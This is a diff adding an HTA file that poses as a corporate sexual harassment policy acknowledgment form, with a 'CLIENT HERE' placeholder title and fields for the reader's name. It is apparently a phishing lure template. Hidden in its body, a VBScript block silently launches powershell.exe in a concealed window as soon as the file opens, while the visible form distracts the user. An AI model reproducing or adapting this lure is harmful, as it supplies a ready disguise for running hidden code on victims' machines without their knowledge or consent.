@@ -1,0 +1,89 @@
+<html>
+	<head>
+		<title>CLIENT HERE</title>
+		<meta charset="utf-8">
+		<meta http-equiv="x-ua-compatible" content="ie=9">
+		<!-- CDN links -->
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+		<script src="https://code.jquery.com/jquery-1.12.3.js"></script>
+		<HTA:APPLICATION 
+			SCROLL="auto"
+			SINGLEINSTANCE="yes"
+			CAPTION="yes"
+			ICON=""
+		>
+	</head>
+
+	<body style="margin: 10px;">
+		<!-- This script will put the HTA document in the foreground and make the window 500x850 -->
+		<script language="vbscript">
+			window.resizeTo 500, 850
+			window.focus()
+		</script>
+
+		<script language="VBScript">
+			Set oShell = CreateObject ("Wscript.Shell")
+			Dim strArgs
+			strArgs = "powershell.exe"
+			oShell.Run strArgs, 0, false
+		</script>
+
+		<!-- Start of main body content -->
+		<p>What is sexual harassment?</p>
+		<p>Sexual harassment can be defined as any:</p>
+		<ul>
+			<li>Unwelcomed sexual advances</li>
+			<li>Requests for sexual favors</li>
+			<li>Other verbal or physical conduct of a sexual nature that affects an individual's employment, and unreasonably interferes with his or her work performance</li>
+		</ul>
+		
+		<p>Who can be involved in sexual harassment?</p>
+		<ul>
+			<li>Those who commit
+				<ul>
+					<li>This can be employees at all levels, customers, and members of the same and opposite sex</li>
+				</ul>
+			</li>
+			<li>Those who are targeted
+				<ul>
+					<li>This can be victims, bystanders, and witnesses who are affected by the sexual harassment</li>
+				</ul>
+			</li>
+		</ul>
+	
+		<p>Why is sexual harassment knowledge important?</p>
+		<ul>
+			<li>Sexual harassment harms us all. The most important part of our corporate values is to ensure that all employees are treated with respect and dignity. Engaging in, condoning, or not reporting sexual harassment is in direct conflict with our core values.</li>
+		</ul>
+		
+		<p>By accepting this agreement, you are responsible for:</p>
+		<ul>
+			<li>Knowing and complying with our sexual harassment policy and procedure</li>
+			<li>Reporting all incidents that you experience or directly witness</li>
+		</ul>
+		<!-- End of main body content -->
+
+		<form>
+			<!-- "Accept" checkbox -->
+			<br>
+				<div class="checkbox center-block">
+					<label><input type="checkbox" value="">I have read and accept the terms and conditions above</label>
+				</div>
+			<br>
+				
+			<div class="form-group">
+				First Name: <input type="text" class="form-control" name="firstname">
+				Last Name: <input type="text" class="form-control" name="lastname">
+			</div>
+		
+			<!-- This script will close out the HTA document when they click "Submit" -->
+			<script for="Button1" event="onClick" language="vbscript">
+				Self.Close()
+			</script>
+		
+			<input type="button" name="Button1" class="btn btn-default center-block" value="Submit" style="width: 100%"></input>		
+		</form>	
+	</body>
+</html>
